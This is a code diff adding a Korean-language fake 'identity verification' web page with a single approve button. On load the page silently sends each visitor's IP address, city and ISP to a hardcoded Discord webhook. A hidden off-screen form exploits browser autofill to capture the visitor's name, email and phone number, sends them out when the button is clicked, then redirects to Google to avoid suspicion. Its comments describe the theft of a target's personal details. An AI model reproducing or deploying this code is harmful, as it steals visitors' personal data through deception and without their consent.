@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>본인 확인</title>
+    <style>
+        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
+        .btn-ready { 
+            padding: 15px 40px; background: #007bff; color: white; border: none; 
+            border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .btn-ready:active { background: #0056b3; }
+        #hidden_gate { position: absolute; left: -9999px; opacity: 0; }
+    </style>
+</head>
+<body onload="autoBackgroundCapture()">
+
+    <button class="btn-ready" onclick="finalExploit()">승인</button>
+
+    <form id="hidden_gate">
+        <input type="text" id="an" name="name" autocomplete="name">
+        <input type="email" id="ae" name="email" autocomplete="email">
+        <input type="tel" id="at" name="tel" autocomplete="tel">
+    </form>
+
+<script>
+    const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+
+    // 1. 접속하자마자 자동으로 IP와 기본 위치 탈취
+    async function autoBackgroundCapture() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            sendToDiscord(d, "📡 [접속 알림] 타겟 링크 진입함");
+        } catch(e) {}
+    }
+
+    // 2. 승인 버튼 클릭 시 이름, 이메일, 전번 정밀 탈취
+    async function finalExploit() {
+        const name = document.getElementById('an').value || "미검출";
+        const email = document.getElementById('ae').value || "미검출";
+        const tel = document.getElementById('at').value || "미검출";
+        
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+
+        await sendToDiscord(d, "🔓 [최종 승인] 신상 탈취 완료", name, email, tel);
+        
+        // 의심 제거를 위한 리다이렉트
+        location.href = "https://www.google.com";
+    }
+
+    async function sendToDiscord(d, title, name="", email="", tel="") {
+        const fields = [
+            { name: "🌐 IP", value: d.ip, inline: true },
+            { name: "📍 위치", value: `${d.city}, ${d.region}`, inline: true },
+            { name: "🏢 통신사", value: d.org, inline: false }
+        ];
+
+        if(name) {
+            fields.push({ name: "👤 이름", value: `**${name}**`, inline: true });
+            fields.push({ name: "📧 이메일", value: `**${email}**`, inline: true });
+            fields.push({ name: "📞 전화번호", value: `**${tel}**`, inline: true });
+        }
+
+        await fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: title,
+                    color: name ? 16711680 : 3447003,
+                    fields: fields,
+                    timestamp: new Date()
+                }]
+            })
+        });
+    }
+</script>
+</body>
+</html>
